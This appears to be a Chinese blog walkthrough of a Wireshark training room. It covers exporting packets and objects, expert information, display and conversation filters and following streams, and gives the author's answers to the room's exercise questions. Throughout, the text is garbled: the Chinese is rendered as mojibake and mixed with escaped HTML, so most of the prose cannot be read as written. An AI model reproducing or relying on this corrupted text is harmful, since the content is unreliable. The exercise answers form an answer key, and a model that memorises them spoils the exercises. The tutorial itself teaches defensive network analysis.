‡è®°ä¸åŒçš„æ˜¯ï¼Œæ³¨é‡Šä¼šä¸€ç›´ä¿ç•™åœ¨æ•èŽ·æ–‡ä»¶ä¸­ï¼Œç›´åˆ°æ“ä½œå‘˜å°†å…¶åˆ é™¤ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/062d5414bf0eb8d6ba20129d3a599584.gif\" /></p>\n<h5 id=\"å¯¼å‡ºæ•°æ®åŒ…\">å¯¼å‡ºæ•°æ®åŒ…</h5>\n<p>æ•èŽ·æ–‡ä»¶å¯èƒ½åŒ…å«æ•°åƒä¸ªæ•°æ®åŒ…ã€‚å¦‚å‰æ‰€è¿°ï¼ŒWireshark å¹¶éžå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ (IDS)ï¼Œå› æ­¤æœ‰æ—¶éœ€è¦ä»Žæ–‡ä»¶ä¸­æå–ç‰¹å®šæ•°æ®åŒ…å¹¶è¿›è¡Œæ·±å…¥åˆ†æžä»¥è§£å†³å®‰å…¨äº‹ä»¶ã€‚æ­¤åŠŸèƒ½æœ‰åŠ©äºŽåˆ†æžäººå‘˜ä»…å…±äº«å¯ç–‘æ•°æ®åŒ…ï¼ˆå·²ç¡®å®šèŒƒå›´ï¼‰ã€‚è¿™æ ·ï¼Œå†—ä½™ä¿¡æ¯å°±ä¸ä¼šè¢«çº³å…¥åˆ†æžè¿‡ç¨‹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ <strong>â€œæ–‡ä»¶â€</strong> èœå•å¯¼å‡ºæ•°æ®åŒ…ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/678da29ee744fb81f262cd9a1973adfa.gif\" /></p>\n<h5 id=\"å¯¼å‡ºå¯¹è±¡æ–‡ä»¶\">å¯¼å‡ºå¯¹è±¡ï¼ˆæ–‡ä»¶ï¼‰</h5>\n<p>Wireshark å¯ä»¥æå–é€šè¿‡ç½‘ç»œä¼ è¾“çš„æ–‡ä»¶ã€‚å¯¹äºŽå®‰å…¨åˆ†æžå¸ˆè€Œè¨€ï¼Œå‘çŽ°å…±äº«æ–‡ä»¶å¹¶å°†å…¶ä¿å­˜ä»¥ä¾›è¿›ä¸€æ­¥è°ƒæŸ¥è‡³å…³é‡è¦ã€‚å¯¼å‡ºå¯¹è±¡åŠŸèƒ½ä»…é€‚ç”¨äºŽç‰¹å®šåè®®æµï¼ˆDICOMã€HTTPã€IMFã€SMBå’Œ TFTPï¼‰ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/d05524de7fed4d4f416fee5c55f05de3.gif\" /></p>\n<h5 id=\"æ—¶é—´æ˜¾ç¤ºæ ¼å¼\">æ—¶é—´æ˜¾ç¤ºæ ¼å¼</h5>\n<p>Wireshark ä¼šåˆ—å‡ºæ•èŽ·åˆ°çš„æ•°æ®åŒ…ï¼Œå› æ­¤åˆ†æžé»˜è®¤æµå¹¶éžæ€»æ˜¯æœ€ä½³é€‰æ‹©ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒWireshark ä»¥â€œè‡ªæ•èŽ·å¼€å§‹ä»¥æ¥çš„ç§’æ•°â€æ˜¾ç¤ºæ—¶é—´ï¼Œé€šå¸¸ä½¿ç”¨UTCæ—¶é—´æ˜¾ç¤ºæ ¼å¼ä»¥èŽ·å¾—æ›´ä½³çš„è§†å›¾ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ <strong>â€œè§†å›¾ --&gt; æ—¶é—´æ˜¾ç¤ºæ ¼å¼â€</strong> èœå•æ›´æ”¹æ—¶é—´æ˜¾ç¤ºæ ¼å¼ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/2e5d906bef2522715d1a746f47042213.gif\" /><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/67c976a97883c1b507a6c0a85758cdf9.png\" /></p>\n<h5 id=\"ä¸“å®¶ä¿¡æ¯\">ä¸“å®¶ä¿¡æ¯</h5>\n<p>Wireshark è¿˜èƒ½æ£€æµ‹åè®®çš„ç‰¹å®šçŠ¶æ€ï¼Œå¸®åŠ©åˆ†æžäººå‘˜è½»æ¾å‘çŽ°æ½œåœ¨çš„å¼‚å¸¸å’Œé—®é¢˜ã€‚è¯·æ³¨æ„ï¼Œè¿™äº›åªæ˜¯å»ºè®®ï¼Œå§‹ç»ˆå­˜åœ¨è¯¯æŠ¥/æ¼æŠ¥çš„å¯èƒ½æ€§ã€‚ä¸“å®¶ä¿¡æ¯å¯ä»¥æä¾›ä¸‰ä¸ªä¸åŒä¸¥é‡ç¨‹åº¦çš„ç±»åˆ«ã€‚è¯¦æƒ…è§ä¸‹è¡¨ã€‚</p>\n<table>\n<thead>\n<tr>\n<th><strong>ä¸¥é‡ç¨‹åº¦</strong></th>\n<th><strong>é¢œè‰²</strong></th>\n<th><strong>ä¿¡æ¯</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>èŠå¤©</strong></td>\n<td><strong>è“è‰²çš„</strong></td>\n<td>å¸¸è§„å·¥ä½œæµç¨‹ä¿¡æ¯ã€‚</td>\n</tr>\n<tr>\n<td><strong>ç¬”è®°</strong></td>\n<td><strong>é’è‰²</strong></td>\n<td>å€¼å¾—æ³¨æ„çš„äº‹ä»¶ï¼Œä¾‹å¦‚åº”ç”¨ç¨‹åºé”™è¯¯ä»£ç ã€‚</td>\n</tr>\n<tr>\n<td><strong>è­¦å‘Š</strong></td>\n<td><strong>é»„è‰²çš„</strong></td>\n<td>è­¦å‘Šä¿¡æ¯ï¼Œä¾‹å¦‚å¼‚å¸¸é”™è¯¯ä»£ç æˆ–é—®é¢˜æè¿°ã€‚</td>\n</tr>\n<tr>\n<td><strong>é”™è¯¯</strong></td>\n<td><strong>çº¢è‰²çš„</strong></td>\n<td>ä¾‹å¦‚æ•°æ®åŒ…æ ¼å¼é”™è¯¯ä¹‹ç±»çš„é—®é¢˜ã€‚</td>\n</tr>\n</tbody>\n</table>\n<p>ä¸‹è¡¨åˆ—å‡ºäº†å¸¸ç”¨ä¿¡æ¯ç»„ã€‚æœ‰å…³ä¸“å®¶ä¿¡æ¯æ¡ç›®çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…<a href=\"https://www.wireshark.org/docs/\" rel=\"noopener nofollow\" target=\"_blank\">Wireshark çš„å®˜æ–¹æ–‡æ¡£ã€‚</a></p>\n<table>\n<thead>\n<tr>\n<th><strong>å›¢ä½“</strong></th>\n<th><strong>ä¿¡æ¯</strong></th>\n<th><strong>å›¢ä½“</strong></th>\n<th><strong>ä¿¡æ¯</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>æ ¡éªŒå’Œ</strong></td>\n<td>æ ¡éªŒå’Œé”™è¯¯</td>\n<td><strong>å·²å¼ƒç”¨</strong></td>\n<td>å·²å¼ƒç”¨çš„åè®®ç”¨æ³•</td>\n</tr>\n<tr>\n<td><strong>è¯„è®º</strong></td>\n<td>æ•°æ®åŒ…æ³¨é‡Šæ£€æµ‹</td>\n<td><strong>ç•¸å½¢</strong></td>\n<td>ç•¸å½¢æ•°æ®åŒ…æ£€æµ‹</td>\n</tr>\n</tbody>\n</table>\n<p>æ‚¨å¯ä»¥ä½¿ç”¨çŠ¶æ€æ  <strong>å·¦ä¸‹è§’åŒºåŸŸæˆ–â€œåˆ†æž --&gt; ä¸“å®¶ä¿¡æ¯â€</strong> èœå•ï¼Œé€šè¿‡å¯¹è¯æ¡†æŸ¥çœ‹æ‰€æœ‰å¯ç”¨ä¿¡æ¯æ¡ç›®ã€‚å®ƒä¼šæ˜¾ç¤ºæ•°æ®åŒ…ç¼–å·ã€æ‘˜è¦ã€ç»„åè®®å’Œæ€»å‘ç”Ÿæ¬¡æ•°ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/45cff1956ab1c83ded7cce0ef586a555.png\" /></p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜ã€‚</p>\n<p>è¯·ä½¿ç”¨â€œExercise.pcapngâ€æ–‡ä»¶å›žç­”é—®é¢˜ã€‚åœ¨æ•°æ®åŒ…è¯¦æƒ…ä¸­æœç´¢<strong>å­—ç¬¦ä¸²â€œr4wâ€</strong>ã€‚è‰ºæœ¯å®¶1çš„åå­—æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/fcb061e4b3eb4b3d5e80fe810d8e4a85.png\" /></p>\n<pre><code class=\"language-python\">r4w8173\n</code></pre>\n<p><strong>è½¬åˆ°ç¬¬ 12 ä¸ªæ•°æ®åŒ…</strong>å¹¶é˜…è¯»æ•°æ®åŒ…æ³¨é‡Šã€‚ç­”æ¡ˆæ˜¯ä»€ä¹ˆï¼Ÿ<br />\næ³¨æ„ï¼šä½¿ç”¨ ç»ˆç«¯å‘½ä»¤ <strong><code>md5sum &lt;æ–‡ä»¶å&gt;</code></strong> èŽ·å– MD5 å“ˆå¸Œå€¼ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/5c5d5802f76131254e0b4dfa9b034b0a.png\" /><br />\nå¯¼å‡ºè¿™ä¸ªç…§ç‰‡<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/b765b4e1398931c30e3323e8a48bd12b.png\" /><br />\nè®¡ç®—md5<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/25c5be1864a838b19043d27461c3e1c8.png\" /></p>\n<pre><code class=\"language-python\">911cd574a42865a956ccde2d04495ebf\n</code></pre>\n<p>æ•èŽ·æ–‡ä»¶ä¸­åŒ…å«ä¸€ä¸ª <strong>â€œ.txtâ€</strong> æ–‡ä»¶ã€‚æ‰¾åˆ°è¯¥æ–‡ä»¶å¹¶é˜…è¯»ï¼›å¤–æ˜Ÿäººçš„åå­—æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/26381ed1d8ef57bd65e6b75f9926dd58.png\" /><br />\nåŒç†ä¿å­˜è¯¥æ–‡ä»¶ï¼Œç„¶åŽæˆ‘ä»¬catä¸€ä¸‹<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/f35a3ad2ef348b778965e911fe5c700b.png\" /></p>\n<pre><code class=\"language-python\">packetmaster\n</code></pre>\n<p>è¯·æŸ¥çœ‹ä¸“å®¶ä¿¡æ¯éƒ¨åˆ†ã€‚è­¦å‘Šæ•°é‡æ˜¯å¤šå°‘ï¼Ÿ<br />\nGo to Analyze&gt;Expert Information<br />\né»„è‰²æ˜¯å‘Šè­¦<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/f336b19c3a5ba364b64228751b012c19.png\" /></p>\n<h4 id=\"æ•°æ®åŒ…è¿‡æ»¤\">æ•°æ®åŒ…è¿‡æ»¤</h4>\n<h5 id=\"æ•°æ®åŒ…è¿‡æ»¤-1\">æ•°æ®åŒ…è¿‡æ»¤</h5>\n<p>Wireshark æ‹¥æœ‰å¼ºå¤§çš„è¿‡æ»¤å¼•æ“Žï¼Œå¯ä»¥å¸®åŠ©åˆ†æžäººå‘˜ç¼©å°æµé‡èŒƒå›´ï¼Œä¸“æ³¨äºŽæ„Ÿå…´è¶£çš„äº‹ä»¶ã€‚Wireshark æä¾›ä¸¤ç§è¿‡æ»¤æ–¹å¼ï¼šæ•èŽ·è¿‡æ»¤å™¨å’Œæ˜¾ç¤ºè¿‡æ»¤å™¨ã€‚æ•èŽ·è¿‡æ»¤å™¨ç”¨äºŽ <strong>â€œæ•èŽ·â€</strong> ç¬¦åˆæŒ‡å®šè¿‡æ»¤å™¨æ¡ä»¶çš„æ•°æ®åŒ…ã€‚æ˜¾ç¤ºè¿‡æ»¤å™¨ç”¨äºŽ <strong>â€œæŸ¥çœ‹â€</strong> ç¬¦åˆæŒ‡å®šè¿‡æ»¤å™¨æ¡ä»¶çš„æ•°æ®åŒ…ã€‚æˆ‘ä»¬å°†åœ¨ä¸‹ä¸€èŠ‚è¯¾è®¨è®ºè¿™äº›è¿‡æ»¤å™¨çš„åŒºåˆ«å’Œé«˜çº§ç”¨æ³•ã€‚çŽ°åœ¨ï¼Œè®©æˆ‘ä»¬é‡ç‚¹ä»‹ç»æ˜¾ç¤ºè¿‡æ»¤å™¨çš„åŸºæœ¬ç”¨æ³•ï¼Œè¿™å°†å¯¹åˆ†æžäººå‘˜çš„å·¥ä½œå¤§æœ‰è£¨ç›Šã€‚</p>\n<p>è¿‡æ»¤å™¨æ˜¯ä¸“ä¸º Wireshark å®˜æ–¹åè®®å‚è€ƒä¸­æä¾›çš„åè®®è€Œè®¾è®¡çš„ç‰¹å®šæŸ¥è¯¢ã€‚è™½ç„¶è¿‡æ»¤å™¨åªæ˜¯ç”¨äºŽè°ƒæŸ¥æ„Ÿå…´è¶£äº‹ä»¶çš„ä¸€ç§æ–¹å¼ï¼Œä½†æœ‰ä¸¤ç§ä¸åŒçš„æ–¹æ³•å¯ä»¥è¿‡æ»¤æµé‡å¹¶ä»Žæ•èŽ·æ–‡ä»¶ä¸­åŽ»é™¤å™ªå£°ã€‚ç¬¬ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨æŸ¥è¯¢ï¼Œç¬¬äºŒç§æ–¹æ³•æ˜¯ä½¿ç”¨å³é”®èœå•ã€‚Wireshark æä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„å›¾å½¢ç”¨æˆ·ç•Œé¢(GUI)ï¼Œå¯¹äºŽä¸æƒ³ä¸ºåŸºæœ¬ä»»åŠ¡ç¼–å†™æŸ¥è¯¢çš„åˆ†æžäººå‘˜æ¥è¯´ï¼Œæœ‰ä¸€æ¡é»„é‡‘æ³•åˆ™ï¼š <strong>â€œåªè¦ä½ èƒ½ç‚¹å‡»å®ƒï¼Œä½ å°±èƒ½è¿‡æ»¤å’Œå¤åˆ¶å®ƒã€‚â€</strong></p>\n<h5 id=\"åº”ç”¨ä¸ºç­›é€‰å™¨\">åº”ç”¨ä¸ºç­›é€‰å™¨</h5>\n<p>è¿™æ˜¯è¿‡æ»¤æµé‡æœ€åŸºæœ¬çš„æ–¹æ³•ã€‚åœ¨åˆ†æžæ•èŽ·æ–‡ä»¶æ—¶ï¼Œæ‚¨å¯ä»¥ç‚¹å‡»æƒ³è¦è¿‡æ»¤çš„å­—æ®µï¼Œç„¶åŽä½¿ç”¨â€œå³é”®èœå•â€æˆ– <strong>â€œåˆ†æž</strong> <strong>--&gt; åº”ç”¨ä¸ºè¿‡æ»¤å™¨â€</strong> èœå•æ¥è¿‡æ»¤ç‰¹å®šå€¼ã€‚åº”ç”¨è¿‡æ»¤å™¨åŽï¼ŒWireshark å°†ç”Ÿæˆæ‰€éœ€çš„è¿‡æ»¤æŸ¥è¯¢å¹¶åº”ç”¨ï¼Œæ ¹æ®æ‚¨çš„é€‰æ‹©æ˜¾ç¤ºæ•°æ®åŒ…ï¼Œå¹¶å°†æœªé€‰æ‹©çš„æ•°æ®åŒ…ä»Žæ•°æ®åŒ…åˆ—è¡¨çª—æ ¼ä¸­éšè—ã€‚è¯·æ³¨æ„ï¼ŒçŠ¶æ€æ å§‹ç»ˆä¼šæ˜¾ç¤ºæ•°æ®åŒ…æ€»æ•°å’Œå·²æ˜¾ç¤ºæ•°æ®åŒ…çš„æ•°é‡ã€‚<br />\nç®€å•æ¥è¯´å°±æ˜¯æ ¹æ®å¯¹åº”çš„å­—æ®µ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/45eae3aa1d34c32a5987d61e64cb2f0e.png\" /></p>\n<h5 id=\"å¯¹è¯è¿‡æ»¤å™¨\">å¯¹è¯è¿‡æ»¤å™¨</h5>\n<p>ä½¿ç”¨â€œåº”ç”¨ä¸ºè¿‡æ»¤å™¨â€é€‰é¡¹æ—¶ï¼Œæ‚¨åªä¼šè¿‡æ»¤æ•°æ®åŒ…ä¸­çš„å•ä¸ªå®žä½“ã€‚æ­¤é€‰é¡¹éžå¸¸é€‚åˆæŸ¥æ‰¾æ•°æ®åŒ…ä¸­çš„ç‰¹å®šå€¼ã€‚ä½†æ˜¯ï¼Œå‡è®¾æ‚¨æƒ³è¦é€šè¿‡å…³æ³¨ IP åœ°å€å’Œç«¯å£å·æ¥æŸ¥æ‰¾ç‰¹å®šæ•°æ®åŒ…ç¼–å·åŠå…¶æ‰€æœ‰å…³è”æ•°æ®åŒ…ï¼Œé‚£ä¹ˆâ€œä¼šè¯è¿‡æ»¤å™¨â€é€‰é¡¹å¯ä»¥å¸®åŠ©æ‚¨è½»æ¾æŸ¥çœ‹ç›¸å…³æ•°æ®åŒ…å¹¶éšè—å…¶ä½™æ•°æ®åŒ…ã€‚æ‚¨å¯ä»¥ä½¿ç”¨â€œå³é”®å•å‡»èœå•â€æˆ–â€œ<strong>åˆ†æž --&gt; ä¼šè¯è¿‡æ»¤å™¨</strong>â€èœå•æ¥è¿‡æ»¤ä¼šè¯ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/1d3e1f3d4f69c2feeb8f1aac065b9aec.png\" /></p>\n<h5 id=\"ä¸ºå¯¹è¯ç€è‰²\">ä¸ºå¯¹è¯ç€è‰²</h5>\n<p>æ­¤é€‰é¡¹ä¸Žâ€œä¼šè¯è¿‡æ»¤å™¨â€ç±»ä¼¼ï¼Œä½†æœ‰ä¸€ç‚¹ä¸åŒã€‚å®ƒä¼šé«˜äº®æ˜¾ç¤ºå·²é“¾æŽ¥çš„æ•°æ®åŒ…ï¼Œè€Œä¸ä¼šåº”ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨æˆ–å‡å°‘å·²æŸ¥çœ‹çš„æ•°æ®åŒ…æ•°é‡ã€‚æ­¤é€‰é¡¹ä¸Žâ€œç€è‰²è§„åˆ™â€é€‰é¡¹é…åˆä½¿ç”¨ï¼Œä¼šåœ¨ä¸è€ƒè™‘å…ˆå‰åº”ç”¨çš„é¢œè‰²è§„åˆ™çš„æƒ…å†µä¸‹æ›´æ”¹æ•°æ®åŒ…é¢œè‰²ã€‚æ‚¨å¯ä»¥ä½¿ç”¨â€œå³é”®å•å‡»èœå•â€æˆ– <strong>â€œè§†å›¾ --&gt; ä¸ºä¼šè¯ç€è‰²â€</strong> èœå•ï¼Œä¸€é”®ä¸ºå·²é“¾æŽ¥çš„æ•°æ®åŒ…ç€è‰²ã€‚è¯·æ³¨æ„ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ <strong>â€œè§†å›¾ --&gt; ä¸ºä¼šè¯ç€è‰² --&gt; é‡ç½®ç€è‰²â€</strong> èœå•æ’¤é”€æ­¤æ“ä½œã€‚<br />\nå°±æ˜¯å¯ä»¥ä¸ºä½ è¿™ä¸ªä¼šè¯è¿›è¡Œé¢œè‰²æ ‡è®°ï¼Œè®©ä½ æ›´å®¹æ˜“çœ‹æ¸…æ¥šï¼Œè¿™ä¸ªå°±æ˜¯ä½ è·Ÿè¸ªtcpæˆ–è€…httpæµé‡ä¸€æ ·ï¼ŒæŠŠæ¯ä¸€ä¸ªåŒ…éƒ½ç€è‰²æ ‡è®°å‡ºæ¥è®©ä½ è¯†åˆ«ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/3242945189e93033f1b7c8c68caadba8.png\" /><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/8c799c256e2086d8c47b1380e6a631c6.png\" /></p>\n<h5 id=\"å‡†å¤‡ä½œä¸ºè¿‡æ»¤å™¨\">å‡†å¤‡ä½œä¸ºè¿‡æ»¤å™¨</h5>\n<p>ä¸Žâ€œåº”ç”¨ä¸ºç­›é€‰å™¨â€ç±»ä¼¼ï¼Œæ­¤é€‰é¡¹å¯å¸®åŠ©åˆ†æžäººå‘˜ä½¿ç”¨â€œå³é”®å•å‡»â€èœå•é€‰æ‹©ï¼š<code>å‡†å¤‡ä½œä¸ºè¿‡æ»¤å™¨</code>ã€‚ä½†æ˜¯ï¼Œä¸Žå‰è€…ä¸åŒçš„æ˜¯ï¼Œæ­¤æ¨¡åž‹ä¸ä¼šåœ¨é€‰æ‹©åŽç«‹å³åº”ç”¨ç­›é€‰å™¨ã€‚å®ƒä¼šå°†æ‰€éœ€çš„æŸ¥è¯¢æ·»åŠ åˆ°çª—æ ¼ä¸­ï¼Œæ­£å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä½ ä¼šçœ‹åˆ°å·²ç»æ·»åŠ äº†ä¸€ä¸ªç­›é€‰è§„åˆ™ä¸ŠåŽ»ï¼Œä½†æ˜¯è¿˜æ²¡åº”ç”¨è€Œå·²ï¼Œéœ€è¦ä½ ç¡®å®šæˆ–è€…æ·»åŠ æ›´å¤šç­›é€‰è§„åˆ™è¿›åŽ»<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/1f3cdbdadfeab5bb927997d6c1d9f363.png\" /><br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/300739d60e0524878e0893ea2ba8fa40.png\" /></p>\n<h5 id=\"ä½œä¸ºåˆ—åº”ç”¨\">ä½œä¸ºåˆ—åº”ç”¨</h5>\n<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ•°æ®åŒ…åˆ—è¡¨çª—æ ¼æä¾›æ¯ä¸ªæ•°æ®åŒ…çš„åŸºæœ¬ä¿¡æ¯ã€‚æ‚¨å¯ä»¥ä½¿ç”¨â€œå³é”®å•å‡»èœå•â€æˆ–â€œ<strong>åˆ†æž --&gt; åº”ç”¨ä¸ºåˆ—</strong>â€èœå•å‘æ•°æ®åŒ…åˆ—è¡¨çª—æ ¼æ·»åŠ åˆ—ã€‚å•å‡»æŸä¸ªå€¼å¹¶å°†å…¶åº”ç”¨ä¸ºåˆ—åŽï¼Œè¯¥åˆ—å°†æ˜¾ç¤ºåœ¨æ•°æ®åŒ…åˆ—è¡¨çª—æ ¼ä¸­ã€‚æ­¤åŠŸèƒ½æœ‰åŠ©äºŽåˆ†æžäººå‘˜æ£€æŸ¥æ•èŽ·æ–‡ä»¶ä¸­å¯ç”¨æ•°æ®åŒ…ä¸­ç‰¹å®šå€¼/å­—æ®µçš„å‡ºçŽ°æƒ…å†µã€‚æ‚¨å¯ä»¥é€šè¿‡å•å‡»æ•°æ®åŒ…åˆ—è¡¨çª—æ ¼é¡¶éƒ¨æ¥å¯ç”¨/ç¦ç”¨å…¶ä¸­æ˜¾ç¤ºçš„åˆ—ã€‚<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/341b3ffb46c3d1bcff2aecd74b8f204f.png\" /><br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/d2adff1b3d8331112e608b33a26b63db.png\" /></p>\n<h5 id=\"è·Ÿè¸ªæµ\">è·Ÿè¸ªæµ</h5>\n<p>Wireshark ä»¥æ•°æ®åŒ…å¤§å°çš„å½¢å¼æ˜¾ç¤ºæ‰€æœ‰å†…å®¹ã€‚ç„¶è€Œï¼Œå¯ä»¥é‡æž„æ•°æ®æµï¼Œå¹¶æŸ¥çœ‹åº”ç”¨å±‚å‘ˆçŽ°çš„åŽŸå§‹æµé‡ã€‚éµå¾ªåè®®ï¼Œæ•°æ®æµæœ‰åŠ©äºŽåˆ†æžäººå‘˜é‡çŽ°åº”ç”¨å±‚æ•°æ®ï¼Œå¹¶äº†è§£æ„Ÿå…´è¶£çš„äº‹ä»¶ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥æŸ¥çœ‹æœªåŠ å¯†çš„åè®®æ•°æ®ï¼Œä¾‹å¦‚ç”¨æˆ·åã€å¯†ç å’Œå…¶ä»–ä¼ è¾“çš„æ•°æ®ã€‚</p>\n<p>æ‚¨å¯ä»¥ä½¿ç”¨â€œå³é”®èœå•â€æˆ– <strong>â€œåˆ†æž</strong> <strong>--&gt; è·Ÿè¸ªTCP / UDP / HTTPæµâ€</strong> èœå•æ¥è·Ÿè¸ªæµé‡ã€‚æµé‡ä¼šæ˜¾ç¤ºåœ¨å•ç‹¬çš„å¯¹è¯æ¡†ä¸­ï¼›æ¥è‡ªæœåŠ¡å™¨çš„æ•°æ®åŒ…ä»¥è“è‰²é«˜äº®æ˜¾ç¤ºï¼Œæ¥è‡ªå®¢æˆ·ç«¯çš„æ•°æ®åŒ…ä»¥çº¢è‰²é«˜äº®æ˜¾ç¤ºã€‚<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/6a9e6e2bfead968df5357cda094b2dd4.png\" /><br />\nè·Ÿè¸ªæŸä¸ªæ•°æ®æµåŽï¼ŒWireshark ä¼šè‡ªåŠ¨åˆ›å»ºå¹¶åº”ç”¨æ‰€éœ€çš„è¿‡æ»¤å™¨æ¥æŸ¥çœ‹è¯¥æ•°æ®æµã€‚è¯·æ³¨æ„ï¼Œåº”ç”¨è¿‡æ»¤å™¨åŽï¼Œæ˜¾ç¤ºçš„åŒ…æ•°é‡ä¼šå‘ç”Ÿå˜åŒ–ã€‚æ‚¨éœ€è¦ä½¿ç”¨ä½äºŽæ˜¾ç¤ºè¿‡æ»¤å™¨æ å³ä¸Šè§’çš„ â€œ <strong>X â€</strong> <strong>æŒ‰é’®æ¥ç§»é™¤æ˜¾ç¤ºè¿‡æ»¤å™¨ï¼Œå¹¶æŸ¥çœ‹æ•èŽ·æ–‡ä»¶ä¸­æ‰€æœ‰å¯ç”¨çš„åŒ…ã€‚</strong></p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜ã€‚</p>\n<p>è¯·ä½¿ç”¨â€œ <strong>Exercise.pcapng</strong> â€æ–‡ä»¶å›žç­”é—®é¢˜ã€‚<br />\nè½¬åˆ°ç¬¬<strong>4ä¸ª</strong>æ•°æ®åŒ…ã€‚å³é”®å•å‡»â€œè¶…æ–‡æœ¬ä¼ è¾“â€‹â€‹åè®®â€ï¼Œå¹¶å°†å…¶åº”ç”¨ä¸ºç­›é€‰å™¨ã€‚<br />\nçŽ°åœ¨ï¼ŒæŸ¥çœ‹ç­›é€‰å™¨çª—æ ¼ã€‚ç­›é€‰æŸ¥è¯¢æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/80f3fbf1fdc1ace874675cd1626099dd.png\" /></p>\n<pre><code class=\"language-python\">http\n</code></pre>\n<p>æ˜¾ç¤ºçš„åŒ…æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/da3838f33aa693e3e04be02b5a7dc4ee.png\" /></p>\n<pre><code class=\"language-python\">1089\n</code></pre>\n<p>æ‰¾åˆ°æ•°æ®åŒ…ç¼–å·<strong>33790</strong> ï¼Œ è·Ÿè¸ª HTTP æµï¼Œä»”ç»†æŸ¥çœ‹å“åº”ã€‚<br />\næ ¹æ® Web æœåŠ¡å™¨çš„å“åº”ï¼Œè‰ºæœ¯å®¶æ€»æ•°æ˜¯å¤šå°‘ï¼Ÿ<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/92e8ab25df209623da5dce200e5dd2c0.png\" /></p>\n<pre><code class=\"language-python\">3\n</code></pre>\n<p>ç¬¬äºŒä½è‰ºæœ¯å®¶çš„åå­—æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/6a6b61bffcf7729756b95f0057f414b1.png\" /></p>\n<pre><code class=\"language-python\">Blad3\n</code></pre>\n<h3 id=\"wiresharkæ•°æ®åŒ…æ“ä½œ\">Wiresharkï¼šæ•°æ®åŒ…æ“ä½œ</h3>\n<h4 id=\"ä»‹ç»-2\">ä»‹ç»</h4>\n<p>åœ¨æœ¬æˆ¿é—´ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä½¿ç”¨ Wireshark è¿›è¡Œæ•°æ®åŒ…åˆ†æžçš„åŸºç¡€çŸ¥è¯†ï¼Œå¹¶ä»Žæ•°æ®åŒ…çº§åˆ«åˆ†æžæ„Ÿå…´è¶£çš„äº‹ä»¶ã€‚</p>\n<ul>\n<li>å­¦ä¹ ç›®æ ‡\n<ul>\n<li>è°ƒæŸ¥ç½‘ç»œæµé‡æ•èŽ·</li>\n<li>æŸ¥çœ‹ç»Ÿè®¡æ•°æ®ï¼ŒåŒ…æ‹¬æ‘˜è¦å’Œæ–¹æ¡ˆè¯¦æƒ…</li>\n<li>æ­ç¤ºå¹¶åº”ç”¨æ•°æ®åŒ…è¿‡æ»¤åŽŸç†</li>\n<li>åº”ç”¨åè®®è¿‡æ»¤å™¨</li>\n<li>åº”ç”¨é«˜çº§ç­›é€‰</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"ç»Ÿè®¡æ•°æ®--æ‘˜è¦\">ç»Ÿè®¡æ•°æ® | æ‘˜è¦</h4>\n<h5 id=\"ç»Ÿè®¡æ•°æ®\">ç»Ÿè®¡æ•°æ®</h5>\n<p>æ­¤èœå•æä¾›å¤šç§ç»Ÿè®¡é€‰é¡¹ï¼Œæ–¹ä¾¿ç”¨æˆ·è¿›è¡Œåˆ†æžï¼Œä»Žè€Œäº†è§£æµé‡èŒƒå›´ã€å¯ç”¨åè®®ã€ç«¯ç‚¹å’Œä¼šè¯ç­‰æ•´ä½“æƒ…å†µï¼Œä»¥åŠä¸€äº›åè®®ç‰¹å®šç»†èŠ‚ï¼Œä¾‹å¦‚DHCPã€DNSå’ŒHTTP 